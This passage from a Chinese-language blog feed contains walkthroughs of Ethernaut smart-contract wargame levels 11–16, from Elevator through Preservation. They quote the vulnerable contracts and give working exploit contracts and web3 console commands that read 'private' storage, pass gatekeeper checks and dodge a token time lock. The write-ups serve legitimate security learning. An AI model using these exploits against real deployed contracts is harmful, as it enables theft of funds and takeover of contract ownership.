//在top那个地方再次反转为false,这样就能保证top一直都是true啦        return t;    }    function attack(address _addr) public{        ele = Elevator(_addr);        ele.goTo(5);    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看合约地址，顶层bool值，还有floor</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113343238.png"></p><p>2、部署合约</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113427972.png"></p><p>发现有一处warning，是因为view产生的，因为在 view 函数中强行改属性也是可以通过编译的，所以可以忽略，有兴趣可以自行将view修改成payable或者no-payable也行</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113729011.png"></p><p>将合约地址进行传参，点击attack</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113851105.png"></p><p>可以看到我们的top变成了true，floor变成了5</p><p>3、这时候top就一直是顶层了，快乐提交就行<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728114559696.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Privacy第12关练习</title>
      <link href="//Ethernaut/Ethernaut/12.Ethernaut-Privacy/"/>
      <url>//Ethernaut/Ethernaut/12.Ethernaut-Privacy/</url>
      
        <content type="html"><![CDATA[<h1 id="Privacy第12关练习"><a href="#Privacy第12关练习" class="headerlink" title="Privacy第12关练习"></a>Privacy第12关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>这份合约的创建者非常小心，以保护其存储的敏感区域。</p><p>解锁此合约以通关。</p><p>可能有帮助的事情：</p><ul><li>了解存储的工作原理</li><li>了解参数解析的工作原理</li><li>了解铸造的工作原理</li></ul><p>提示：</p><ul><li>请记住，metamask 只是一种商品。如果出现问题，请使用其他工具。高级游戏可能涉及使用 remix 或您自己的 web3 提供商。</li></ul><p>目标：解锁需要一个 key，而这个 key 是 data[2] 是 private 的</p><p>  在区块链上面没有私密的东西，都是公开的，只要找到就能过关</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy {  bool public locked = true;  uint256 public ID = block.timestamp;  uint8 private flattening = 10;  uint8 private denomination = 255;  uint16 private awkwardness = uint16(now);  bytes32[3] private data;  constructor(bytes32[3] memory _data) public {    data = _data;  }    function unlock(bytes16 _key) public {    require(_key == bytes16(data[2]));    locked = false;  }  /*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU  */}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>根据solidity 文档中的变量存储原则：静态大小的变量（除 映射mapping 和动态数组之外的所有类型）都从位置 <code>0</code> 开始连续放置在 存储storage 中。如果可能的话，存储需求少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下：</p><ul><li>存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。</li><li>基本类型仅使用存储它们所需的字节。</li><li>如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。</li><li>结构（struct）和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。</li></ul><p><a href="https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html">存储storage 中的状态变量储存结构</a></p><p>例如，按照 <code>uint128，uint128，uint256</code> 的<strong>顺序声明你的存储变量</strong>，而不是 <code>uint128，uint256，uint128</code>， 因为前者只占用两个 存储插槽storage slot，而后者将占用三个。</p><p>分析一下合约中的变量：</p><pre><code>// 1 byte, slot 0bool public locked = true;// 32 bytes, slot 1uint256 public ID = block.timestamp;// 1 byte, slot 2uint8 private flattening = 10;// 1 byte, slot 2uint8 private denomination = 255;// 2 byte, slot 2uint16 private awkwardness = uint16(now);// bytes32[0], 32 bytes, slot 3; bytes32[1], 32 bytes, slot 4; bytes32[2], 32 bytes, slot 5bytes32[3] private data;</code></pre><p>第一个变量是一个bool值占1个byte，和一个slot，按顺序下一个变量ID占有32个bytes，所以需要单独占一个存储插槽storage slot ，变量<code>flattening</code>,<code>denomination</code>,<code>awkwardness</code>加起来占有32bytes，所以他们3个变量占用一个存储槽，最后是3个32bytes的变量，各占一个。因为</p><pre><code>  function unlock(bytes16 _key) public {    require(_key == bytes16(data[2]));    locked = false;  }</code></pre><p>我们所需要的data[2]就是存在于第六个slot中也就是slot 5中，取出的方法有：</p><pre><code class="通过await实现">await web3.eth.getStorageAt(instance, 5);</code></pre><pre><code class="通过提示栏实现">web3.eth.getStorageAt(instance,5,function(x,y){alert(y);})</code></pre><pre><code class="通过控制台实现">web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);})</code></pre><p>最后我们调用函数unlock即可解锁</p><p>需要注意的是，要解锁合约的 <code>_key</code> 是 bytes16 类型的，而 data 是 bytes32 类型的，bytes32 转换到 bytes 16 会截断超出的 bytes，也就是我们只取前 16 个 bytes 就好。</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看锁状态</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728140747908.png"></p><p>2、将第六个存储槽内容取出，slot5：</p><pre><code>web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);})</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728151630603.png">4、调用unlock函数解锁，应为它限定了是byte16所以他自己会截断，也可以手动取16bytes数据</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728151702758.png"></p><p>5、为了更加直观的看到存储情况，我们将其一一打印出来对照</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728152112921.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728152401510.png"></p><p>还可以观察发现变量<code>flattening = 10</code> ,<code>和denomination = 255</code>在里面存储着</p><p>6、好了，玩的差不多，快乐提交吧，对了，网上有些地方过关的方法可能错误，多尝试，仔细甄别哦，理解原理才是关键</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728152640325.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gatekeeper One第13关练习</title>
      <link href="//Ethernaut/Ethernaut/13.Ethernaut-Gatekeeper%20One/"/>
      <url>//Ethernaut/Ethernaut/13.Ethernaut-Gatekeeper%20One/</url>
      
        <content type="html"><![CDATA[<h1 id="Gatekeeper-One第13关练习"><a href="#Gatekeeper-One第13关练习" class="headerlink" title="Gatekeeper One第13关练习"></a>Gatekeeper One第13关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>通过守门员并注册为进入者以通过此级别。</p><p>绕过三个 gate 来执行 enter 函数</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract GatekeeperOne {  using SafeMath for uint256;  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;//要求tx.origin不等于请求者，通过其他合约调用实现绕过  }  modifier gateTwo() {    require(gasleft().mod(8191) == 0);    _;//gas要满足8191取余为0  }  modifier gateThree(bytes8 _gateKey) {      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件，先说第一步和第三步：<br>1、gateOne ：通过其他合约来进行调用即可使得msg.sender和tx.origin不等绕过，假设用户通过合约A调用合约B：</p><ul><li><p>对于合约A：tx.origin和msg.sender都是用户</p></li><li><p>对于合约B：tx.origin是用户，msg.sender是合约A的地址</p></li></ul><hr><p>3、gateThree() ：</p><pre><code>modifier gateThree(bytes8 _gateKey) {    require(uint32(_gateKey) == uint16(_gateKey));    require(uint32(_gateKey) != uint64(_gateKey));    require(uint32(_gateKey) == uint16(tx.origin));    _;}</code></pre><ul><li><p>先看最后一个判断 tx.origin 是最初的调用者，就是我们的账户，uint16 是最后 8 字节，要与 uint32 的 key 也就是最后 16 字节相等，所以 key 的最后 8 字节就是 tx.origin 的最后 8 字节</p></li><li><p>同时如果第一个条件 uint32 的 key 要与 uint16 的 key 相等，所以 key 的 uint32 类型 16 字节前面的八个字节要全为 0</p></li><li><p>再看中间那个，key 的后 16 字节还不能和整个 32 字节相等，前面只要不是 0 就不会相等</p></li></ul><p>uint16(address) 的转换会保留 address 最后两个字节，由上述 1，3 可得，uint32(uint64(_gateKey)) 等于 uint32(tx.origin) &amp; 0x0000FFFF。再结合上述 2，只要 _gateKey 的最后 4 个字节为 uint32(tx.origin) &amp; 0x0000FFFF，其前面的 4 个字节可以为全 0 外的任意值。我们这里直接取 player 地址的最后八个字节，然后将 <code>tx.origin</code> 倒数三四字节换成 0000  得到 _gateKey。</p><p>综上，key 如果是bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF的话就正好可以</p><hr><p>2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完 msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript VM环境下进行Debug可在Step detail 栏中可以看到这个变量，我们尝试在VM中进行调试一下：</p><pre><code>pragma solidity ^0.4.18;contract GatekeeperOne {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;//可以部署一个中间合约来调用绕过  }  modifier gateTwo() {    require(msg.gas % 8191 == 0);    _;//gas要满足8191取余为0  }  modifier gateThree(bytes8 _gateKey) {    require(uint32(_gateKey) == uint16(_gateKey));    require(uint32(_gateKey) != uint64(_gateKey));    require(uint32(_gateKey) == uint16(tx.origin));    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}contract MyAgent {    GatekeeperOne c;      function MyAgent(address _c) public {        c = GatekeeperOne(_c);    }    function exploit() public {        bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff;        c.enter.gas(81910)(_gateKey);            }}</code></pre><p>使用这个代码在remix中运行，编译成功</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728182952119.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728183204095.png"></p><p>先获取到合约地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728183306685.png"></p><p>将合约地址复制给MyAgent中去进行Deploy</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728183442225.png"></p><p>直接exploit，报错，然后点击debug，注意，这里我们是为了得到执行到第二步的gas查看的<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728184750142.png"></p><p>通过将游标移动到大致这个位置，目的是找到GAS和DUP2这两个地方，GAS关键字是获取执行可用的gas。由于EVM是栈虚拟机，因此此处需要注意获取到的gas后的dup2，dup2是将栈内的第2个元素（从栈顶向下算）移至栈顶。查看他们Step details中的gas和remaining gas，其中gas表示这一小步到下一小步需要的gas使用量，remaining gas表示gas的剩余量，而我们所需要的msg.gas就是remaining gas。<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728185021596.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728185116971.png"></p><p>也就是说我们从最开始给到的gas，81910，执行到我们的第二步使用了81910-81695=215的gas，这里妙就妙在81910本身就是8191的倍数，只要我们如果我们想要让这一步结束之后 remaining gas % 8191 = 0 的话，或者说想要让他执行完之后刚好是 81910 的话，就需要让之前的值为：213+2+81910。所以想要绕过第二个关卡的话，值应该是 213+2+81910。这时候我们只需要把代码中给到的gas修改成81910+215=82125就可以，让我们来验证一下</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728190814576.png"></p><p><code>entrant</code> 已经从 <code>0x0000000000000000000000000000000000000000</code> 变为你的 player 地址，测试成功，开启实战吧</p><hr><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，查看玩家地址，合约地址，查看entrant当前数值</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728191237471.png"></p><p>2、直接使用相同的合约，复制合约地址给攻击合约进行编译，但是这里存在一个问题，我们并不知道通过remix上链和到达我们所需要的GAS的时候到底需要多少gas，这里需要测试几下。直接编译上链exploit<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728195333261.png">点击exploit会失败，我们去钱包里面找到失败的交易</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728195820468.png"></p><p>去etherscan上查看，点击右上角小标中的GETH调试追溯</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728195918148.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728200125669.png">、</p><p>找到GAS，并且分析整个上链执行的过程并记录</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728202312192.png"></p><p>几组数据观察可以发现，21064和5042可能是上链或者链上数据使用的gas，而从step[101]到GAS中间始终是252，step[101]正好是我们合约中所输入的gas，（第二组数据可能是因为我修改了gaslimit太小产生的溢出出错，这些都不重要），我们只要让[101]中的数等于81910+2+252=82164即可（注意这里需要加2，因为gas走到下一步需要2的gas）于是修改gas数值</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728203007877.png"></p><p>部署合约，地址，编译，攻击，成功！！！</p><p>3、检查结果，快乐提交！<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728203202200.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gatekeeper Two第14关练习</title>
      <link href="//Ethernaut/Ethernaut/14.Ethernaut-Gatekeeper%20Two/"/>
      <url>//Ethernaut/Ethernaut/14.Ethernaut-Gatekeeper%20Two/</url>
      
        <content type="html"><![CDATA[<h1 id="Gatekeeper-Two第14关练习"><a href="#Gatekeeper-Two第14关练习" class="headerlink" title="Gatekeeper Two第14关练习"></a>Gatekeeper Two第14关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>通过看门人的三道检查，成为进入者(entrant)。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller()) }    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p><code>gateOne()</code>：我们可以用第三方合约来调用 <code>enter()</code> 实现绕过</p><p><code>gateTwo()</code>：gateTwo中extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 <code>EXTCODESIZE()</code> 返回为 0。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。</p><p><code>gateThree()</code>：传入一个八字节的 key，把 msg.sender 的 hash 计算出来与 uint64 类型的 key 异或，要等与 0-1，也就是 0xFFFFFFFFFFFFFFFF，只要我们先用 uint64(keccak256(msg.sender)) 与 0xFFFFFFFFFFFFFFFF 进行异或，这样再次异或的时候就成了 0xFFFFFFFFFFFFFFFF，也就符合条件了（优先级为 – 大于 ^ 大于 ==）最后攻击合约如下：</p><pre><code>pragma solidity ^0.4.25;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller) }    //用内联汇编来获取调用方caller的代码大小    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}contract HackGateTwo {    constructor(address _addr) public {        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));        (bool success, ) = _addr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));        require(success);    }}</code></pre><p>要注意使用constructor函数，以下两个同理：</p><pre><code>contract HackGateTwo {    constructor(address _addr) public {        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));        (bool success, ) = _addr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));        require(success);    }}</code></pre><pre><code>contract Attack {    GatekeeperTwo target = GatekeeperTwo(instance_address);    constructor(address instance_address) public {        target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1)));    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，查看合约信息，合约地址，合约entrant()<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729101109854.png"></p><p>2、部署合约，将合约地址复制到攻击合约中编译执行<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729105406644.png"></p><p>3、查看 <code>entrant</code> 发现已经发生变化，说明攻击成功，提交即可过关。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729105456225.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729105645043.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Naught Coin第15关练习</title>
      <link href="//Ethernaut/Ethernaut/15.Ethernaut-Naught%20Coin/"/>
      <url>//Ethernaut/Ethernaut/15.Ethernaut-Naught%20Coin/</url>
      
        <content type="html"><![CDATA[<h1 id="Naught-Coin第15关练习"><a href="#Naught-Coin第15关练习" class="headerlink" title="Naught Coin第15关练习"></a>Naught Coin第15关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>NaughtCoin 是一个标准的 ERC20 token 合约，并且你已经拥有了所有的 token。但是问题是，需要10年后才能够执行 transfer 将 token 转移。现在你的目标是突破限制，将所有 token 转移到别的地址，使用合约中你的 token 余额变为 0。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 {  // string public constant name = 'NaughtCoin';  // string public constant symbol = '0x0';  // uint public constant decimals = 18;  uint public timeLock = now + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20('NaughtCoin', '0x0')  public {    player = _player;    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  }    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {    super.transfer(_to, _value);  }  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() {    if (msg.sender == player) {      require(now &gt; timeLock);      _;    } else {     _;    }  } } </code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>根据题意，需要将自己的 balance 清空。合约里提供了 <code>transfer()</code> 函数来进行转账操作，但注意到有一个 modifier <code>lockTokens()</code>，限制了只有十年后才能调用 <code>transfer()</code> 函数。需要解题者 bypass it，注意到该合约是 <code>StandardToken</code> 的子合约，以上代码我们可以看出合约NaughtCoin继承了StandardToken但是没有对父合约做重写，导致利用父合约的函数可以进行及时转账。而子合约NaughtCoin也没有什么问题，那我们还是回过头来看看import的父合约 StandardToken.sol。题目中也给出了源码库地址与 ERC20 接口规范文档<br><a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts</a><br><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</a></p><p>在子合约中找不出更多信息的时候，把目光更多放到父合约和接口上，在接口规范里能看到，除了 <code>transfer()</code> 之外，还有 <code>transferFrom()</code> 函数也可以进行转账操作。重写transferFrom就是一个可利用的点。直接看看StandardToken.sol代码：</p><pre><code>contract StandardToken {    using ERC20Lib for ERC20Lib.TokenStorage;    ERC20Lib.TokenStorage token;    ...    function transfer(address to, uint value) returns (bool ok) {         return token.transfer(to, value);       }    function transferFrom(address from, address to, uint value) returns (bool ok) {         return token.transferFrom(from, to, value);       }    ...}</code></pre><p>跟进ERC20Lib.sol：</p><pre><code>library ERC20Lib {    ...    function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) {        self.balances[msg.sender] = self.balances[msg.sender].minus(_value);        self.balances[_to] = self.balances[_to].plus(_value);        Transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) {        var _allowance = self.allowed[_from](msg.sender);        self.balances[_to] = self.balances[_to].plus(_value);        self.balances[_from] = self.balances[_from].minus(_value);        self.allowed[_from](msg.sender) = _allowance.minus(_value);        Transfer(_from, _to, _value);        return true;    }    ...    function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) {        self.allowed[msg.sender](_spender) = _value;        Approval(msg.sender, _spender, _value);        return true;    }}</code></pre><p>需要注意的是，与 <code>transfer()</code> 不同，调用 <code>transferFrom()</code> 需要 <code>msg.sender</code> 获得授权。由于我们本就是合约的 owner，可以自己给自己授权。授权操作在接口文档里也有</p><pre><code class="javascript">function approve(address _spender, uint256 _value) returns (bool success)</code></pre><p>此处可以直接调用这个transferFrom了。但是transferFrom有一步权限验证，要验证这个msg.sender是否被_from（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用approve 给自己授权。</p><p>部署完成后复制合约地址，直接在题目界面 console 操作，需要注意toWei语句表达方式，默认单位是ether</p><p><a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">web3.js toWei</a></p><pre><code class="javascript">await contract.approve(player,web3.utils.toWei('1000000'))// 给自己授权await contract.transferFrom(player,contract.address,web3.utils.toWei('1000000'))// 向刚部署的第三方合约转钱，清空 player 的 balance</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看一下当前账户余额，可以看到是25位，那么我们允许的是就是1000000ether，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729132832063.png"></p><p>2、使用approve进行授权</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729132958527.png"></p><p>3、通过transferFrom来实施转账，注意默认单位是ether，别出错</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133054558.png" alt="image-20210729133054558"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133200014.png"></p><p>4、查看余额，钱包中的代币消失了，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133218542.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729133241089.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Preservation第16关练习</title>
      <link href="//Ethernaut/Ethernaut/16.Ethernaut-Preservation/"/>
      <url>//Ethernaut/Ethernaut/16.Ethernaut-Preservation/</url>
      
        <content type="html"><![CDATA[<h1 id="Preservation第16关练习"><a href="#Preservation第16关练习" class="headerlink" title="Preservation第16关练习"></a>Preservation第16关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Preservation {  //公共图书馆合约  address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  //设置delegatecall的函数签名  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  }   //设置时区1的时间  function setFirstTime(uint _timeStamp) public {    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }  //设置时区2的时间  function setSecondTime(uint _timeStamp) public {    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }}//简单的图书馆合同来设定时间contract LibraryContract {  //存储时间戳  uint storedTime;    function setTime(uint _time) public {    storedTime = _time;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>先回忆一下</p><pre><code>call()当使用方法是：require(msg.sender.call.value(_weiToWithdraw)());则作用是将_weiToWithdraw个以太币发送给msg.sender地址，并且调用msg.sender地址的fallback函数当使用方法是：bytes4 methodId = bytes4(keccak256("increaseAge(string,uint)"));//函数hashaddr.call(methodId,"jack",1);那就是调用了函数increaseAge，并且传入参数是"jack",1</code></pre><p><code>call()</code>的返回结果是一个<code>bool</code>，表示是否成功的调用，或者是失败引起了EVM异常。该方法无法直接访问函数返回结果(因为需要事前知道编码和返回结果大小)。</p><p><code>call()</code>的返回结果即使成功，并不能说操作成功了，只是没有出现异常，比如我们第一个例子中，实际是调用到了<code>fallback()</code>函数。</p><h2 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall()"></a>delegatecall()</h2><p><code>call</code>与<code>delegatecall</code>的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。</p><p>函数的设计目的是为了使用存储在另一个合约的库代码。</p><p>二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行</p><p>三种调用方式的异同点</p><ul><li><p>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 